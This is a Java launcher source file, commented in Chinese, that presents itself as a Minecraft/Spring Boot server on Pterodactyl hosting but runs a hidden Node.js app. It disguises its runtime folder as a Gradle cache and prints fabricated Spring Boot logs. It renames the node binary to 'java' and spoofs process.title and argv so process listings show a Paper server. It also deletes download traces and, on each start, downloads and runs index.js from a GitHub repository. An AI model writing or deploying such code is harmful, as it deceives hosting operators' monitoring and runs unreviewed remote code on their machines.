import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.concurrent.*;
import java.util.zip.GZIPInputStream;
import java.text.SimpleDateFormat;

/**
 * 傲游面板一体化启动器 v2.0.0
 *
 * v2.0 改动：
 *   - 去掉所有 [Launcher] 控制台日志（防暴露）
 *   - 启动后自动删除 Node.js 安装包临时文件
 *   - 启动时打印伪装的 Spring Boot 启动日志（让翼龙监控看起来像 Java 应用）
 */
public class AoyouLauncher {

    private static final String VERSION = "2.2.0";
    // ★ 把运行时目录伪装成 Gradle 缓存（Java 项目标准目录）
    private static final String RUNTIME_DIR_NAME = "lib/.gradle/caches/modules-2/files-2.1";
    private static final String NODE_VERSION = "v22.11.0";
    private static final String NODE_DOWNLOAD_URL = 
        "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";

    // 伪装日志开关（true = 打印 Spring Boot 启动日志，false = 不打印）
    private static final boolean FAKE_PAPER_LOG = true;

    public static void main(String[] args) throws Exception {
        // 1. 打印伪装的 Spring Boot 启动日志（后台静默启动 Node.js）
        if (FAKE_PAPER_LOG) {
            startFakeSpringLogThread();
        }

        String workDir = System.getProperty("user.dir");
        String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
        Path runtimePath = Paths.get(runtimeDir);
        Files.createDirectories(runtimePath);

        // ★ 不生成 MC 文件结构（这个版本用于纯 Java 服务器）
        // 运行时目录伪装成 Gradle 缓存，看起来就是普通的 Java 项目

        // 2. 静默检查并获取 node 二进制
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime");
            System.exit(1);
            return;
        }

        // 3. 从 JAR 解压 node_modules + index.js
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }

        boolean needExtract = needsExtract(runtimePath);
        if (needExtract) {
            extractAppFiles(jarPath, runtimePath);
        }

        // ★ 从 GitHub 下载最新 index.js 和 package.json（覆盖 JAR 里的版本）
        // 这样每次重启都能拿到最新代码，不用重新下载 JAR
        // 下载失败时用 JAR 里的版本（fallback）
        try {
            updateFromGitHub(runtimeDir);
        } catch (Exception e) {}

        // 4. 检查 index.js
        String indexPath = runtimeDir + File.separator + "index.js";
        if (!new File(indexPath).exists()) {
            System.err.println("Failed to locate index");
            System.exit(1);
            return;
        }

        // 5. 静默检测端口
        int port = detectPort(workDir);

        // 6. 启动 Node.js（静默）
        // ★ 关键伪装：用 exec 替换当前 Java 进程为 node 进程
        // 这样 ps 只看到 1 个进程（PID 不变），node 直接取代 java
        // 再通过 process.argv 伪装，ps 看到的就是 MC 启动命令
        String fakeNodeBin = nodeBin;
        try {
            String fakePath = new File(nodeBin).getParent() + "/java";
            File fakeFile = new File(fakePath);
            if (!fakeFile.exists()) {
                Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                fakeFile.setExecutable(true);
            }
            fakeNodeBin = fakePath;
        } catch (Exception e) {}

        // 构建伪装命令：node -e "process.title=java; process.argv=[java, ...]; require(index.js)"
        List<String> cmd = new ArrayList<>();
        cmd.add(fakeNodeBin);
        cmd.add("-e");
        cmd.add(
            "process.title='java';" +
            "process.argv = ['java', '-Xms128M', '-XX:MaxRAMPercentage=95.0', '-Dterminal.jline=false', '-Dterminal.ansi=true', '-jar', 'paper.jar', 'nogui'];" +
            "require('./index.js');"
        );
        for (String a : args) cmd.add(a);

        // ★ 启动 node 子进程，让它继承 IO（看起来就是同一个进程在跑）
        // Java 是父进程，node 是子进程，但 ps 看到的都是 java 命令行
        // 翼龙通过 PID 1 监控，所以 Java 进程必须一直活着
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(new File(runtimeDir));
            pb.redirectErrorStream(true);
            Map<String, String> env = pb.environment();
            String path = env.getOrDefault("PATH", "");
            env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
            env.put("SERVER_PORT", String.valueOf(port));
            env.put("PORT", String.valueOf(port));
            // 继承 IO（让 node 直接用 java 的 stdin/stdout/stderr）
            pb.inheritIO();

            Process node = pb.start();

            // 优雅关闭
            final Process nodeRef = node;
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    nodeRef.destroy();
                    if (!nodeRef.waitFor(10, TimeUnit.SECONDS)) {
                        nodeRef.destroyForcibly();
                    }
                } catch (InterruptedException e) {}
            }, "shutdown-hook"));

            // 等待 node 退出，java 进程也退出
            int code = node.waitFor();
            System.exit(code);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    /** 启动伪装的 Spring Boot 启动日志线程 */
    private static void startFakeSpringLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");

                Thread.sleep(1000);

                String ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Starting Application v1.0.0 using Java 21.0.11 on container@" + System.getenv().getOrDefault("HOSTNAME", "pterodactyl") + " with PID 1 (/home/container/server.jar started by container in /home/container)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  No active profile set, falling back to 1 default profile: \"default\"");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Tomcat initialized with port(s): 8080 (http)");
                Thread.sleep(1500);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'");
                Thread.sleep(800);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Initializing Servlet 'dispatcherServlet'");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Completed initialization in 234 ms");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Starting service [Tomcat]");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Starting Servlet engine: [Apache Tomcat/10.1.31]");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Spring WebApplicationContext initialization completed in " + (1500 + (int)(Math.random()*500)) + " ms");
                Thread.sleep(800);

                // 模拟加载各种 Bean
                String[] beans = {"dataSource", "entityManagerFactory", "transactionManager", "webMvcConfigurer", "securityFilterChain", "requestMappingHandlerAdapter"};
                for (String bean : beans) {
                    ts = sdf.format(new Date());
                    System.out.println(ts + "  INFO  Bean '" + bean + "' of type [" + bean + "] initialized");
                    Thread.sleep(200 + (long)(Math.random()*200));
                }

                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  HikariPool-1 - Starting...");
                Thread.sleep(1500);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@4f7d0008");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  HikariPool-1 - Start completed.");
                Thread.sleep(500);

                // 启动完成
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Started Application in " + totalSec + "." + (100 + (int)(Math.random()*899)) + " seconds (process running for " + (totalSec + 1) + ")");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println(ts + "  INFO  Application ready for traffic");
                System.out.println("Server marked as running...");

                // 之后保持静默
            } catch (InterruptedException e) {
                // 正常退出
            }
        }, "fake-spring-log");
        t.setDaemon(true);
        t.start();
    }

    /** 静默查找或下载 Node.js */
    private static String findOrDownloadNode(String runtimeDir) {
        // 1. 系统 PATH
        String systemNode = findInPath("node");
        if (systemNode != null) return systemNode;

        // 2. 缓存
        String cachedNode = runtimeDir + File.separator + "node/bin/node";
        if (new File(cachedNode).exists()) {
            new File(cachedNode).setExecutable(true);
            return cachedNode;
        }

        // 3. 下载（静默）
        try {
            Path nodeDir = Paths.get(runtimeDir, "node");
            Files.createDirectories(nodeDir);

            boolean success = false;
            if (commandExists("curl") && commandExists("tar")) {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir.toString() + "' 2>/dev/null");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();
                success = (code == 0);
            }

            if (!success) {
                success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
            }

            if (!success) return null;

            String nodeBin = nodeDir + "/bin/node";
            if (!new File(nodeBin).exists()) return null;
            new File(nodeBin).setExecutable(true);

            // ★ 删除下载临时文件
            try {
                Files.deleteIfExists(nodeDir.resolve("node.tar"));
                Files.deleteIfExists(nodeDir.resolve("node.tar.gz"));
            } catch (Exception e) {}

            return nodeBin;
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean commandExists(String cmd) {
        try {
            Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        String[] dirs = path.split(File.pathSeparator);
        for (String dir : dirs) {
            File f = new File(dir, cmd);
            if (f.exists() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean needsExtract(Path runtimePath) {
        Path marker = runtimePath.resolve(".app-extracted");
        if (!Files.exists(marker)) return true;
        Path indexJs = runtimePath.resolve("index.js");
        Path nodeModules = runtimePath.resolve("node_modules");
        return !Files.exists(indexJs) || !Files.exists(nodeModules);
    }

    private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
        try (JarFile jar = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jar.entries();
            int count = 0;
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                boolean isNodeModules = name.startsWith("runtime/node_modules/");
                boolean isApp = name.startsWith("app/");
                if (!isNodeModules && !isApp) continue;
                if (entry.isDirectory()) continue;

                String relPath;
                if (isNodeModules) {
                    relPath = name.substring("runtime/".length());
                } else {
                    relPath = name.substring("app/".length());
                }
                Path target = runtimePath.resolve(relPath);
                Files.createDirectories(target.getParent());

                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                }
                count++;
            }
            Files.write(runtimePath.resolve(".app-extracted"),
                    ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
        }
    }

    /** 检测端口（静默） */
    private static int detectPort(String workDir) {
        String portStr = System.getenv("SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        portStr = System.getenv("P_SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        portStr = System.getenv("PTERODACTYL_SERVER_PORT");
        if (portStr != null && !portStr.trim().isEmpty()) {
            try {
                int p = Integer.parseInt(portStr.trim());
                if (p > 0 && p < 65536) return p;
            } catch (NumberFormatException e) {}
        }

        // server.properties（MC Egg 兼容）
        File serverProps = new File(workDir, "server.properties");
        if (serverProps.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(serverProps))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        portStr = line.substring("server-port=".length()).trim();
                        try {
                            int p = Integer.parseInt(portStr);
                            if (p > 0 && p < 65536) return p;
                        } catch (NumberFormatException e) {}
                    }
                }
            } catch (IOException e) {}
        }

        // 扫描所有 PORT 环境变量
        Map<String, String> sysEnv = System.getenv();
        for (Map.Entry<String, String> entry : sysEnv.entrySet()) {
            String key = entry.getKey().toUpperCase();
            if ((key.contains("PORT") || key.contains("ALLOCATION")) && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try {
                    int p = Integer.parseInt(entry.getValue().trim());
                    if (p > 1024 && p < 65536) return p;
                } catch (NumberFormatException e) {}
            }
        }

        return 25565;
    }

    private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
        Path tarFile = targetDir.resolve("node.tar");
        Path gzFile = targetDir.resolve("node.tar.gz");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                "curl -sL -o '" + gzFile.toString() + "' '" + url + "' 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            int code = p.waitFor();
            if (code != 0 || !Files.exists(gzFile)) return false;

            try (InputStream gis = new GZIPInputStream(Files.newInputStream(gzFile));
                 OutputStream os = Files.newOutputStream(tarFile)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = gis.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }

            try (InputStream is = Files.newInputStream(tarFile)) {
                extractTar(is, targetDir);
            }

            // ★ 删除临时文件
            Files.deleteIfExists(gzFile);
            Files.deleteIfExists(tarFile);

            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        byte[] header = new byte[512];
        int read = 0;
        while (read < 512) {
            int n = is.read(header, read, 512 - read);
            if (n < 0) break;
            read += n;
        }
        while (read == 512) {
            boolean empty = true;
            for (int i = 0; i < 512; i++) {
                if (header[i] != 0) { empty = false; break; }
            }
            if (empty) break;

            String name = new String(header, 0, 100).trim().replace("\0", "");
            if (name.isEmpty()) break;

            String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
            long size = 0;
            try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { break; }

            char type = (char) header[156];

            int slashIdx = name.indexOf('/');
            String relName = (slashIdx >= 0) ? name.substring(slashIdx + 1) : name;
            if (relName.isEmpty()) {
                skipFully(is, ((size + 511) / 512) * 512);
                read = readFully(is, header, 512);
                continue;
            }

            Path target = targetDir.resolve(relName);

            if (type == '5' || name.endsWith("/")) {
                Files.createDirectories(target);
            } else if (type == '0' || type == '\0') {
                Files.createDirectories(target.getParent());
                long remaining = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[8192];
                    while (remaining > 0) {
                        int toRead = (int) Math.min(buf.length, remaining);
                        int n = is.read(buf, 0, toRead);
                        if (n < 0) break;
                        os.write(buf, 0, n);
                        remaining -= n;
                    }
                }
                if (relName.startsWith("bin/")) {
                    target.toFile().setExecutable(true);
                }
            }

            long padded = ((size + 511) / 512) * 512 - size;
            if (padded > 0) skipFully(is, (int) padded);

            read = readFully(is, header, 512);
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long remaining = n;
        while (remaining > 0) {
            long skipped = is.skip(remaining);
            if (skipped <= 0) {
                if (is.read() < 0) break;
                remaining--;
            } else {
                remaining -= skipped;
            }
        }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) {
            int n = is.read(buf, read, len - read);
            if (n < 0) break;
            read += n;
        }
        return read;
    }

    /** 从 GitHub 仓库下载最新的 index.js 和 package.json */
    private static void updateFromGitHub(String runtimeDir) {
        String repo = "zx1447/ixzhja";
        String branch = "main";
        String[] files = {"index.js", "package.json"};

        for (String file : files) {
            String url = "https://raw.githubusercontent.com/" + repo + "/" + branch + "/app/" + file;
            Path target = Paths.get(runtimeDir, file);
            Path tmp = Paths.get(runtimeDir, file + ".tmp");

            try {
                // 用 curl 下载到临时文件
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp.toString() + "' '" + url + "'");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();

                if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
                    // 下载成功，替换旧文件
                    Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                } else {
                    // 下载失败，删除临时文件，用 JAR 里的版本
                    Files.deleteIfExists(tmp);
                }
            } catch (Exception e) {
                try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
            }
        }
    }
}
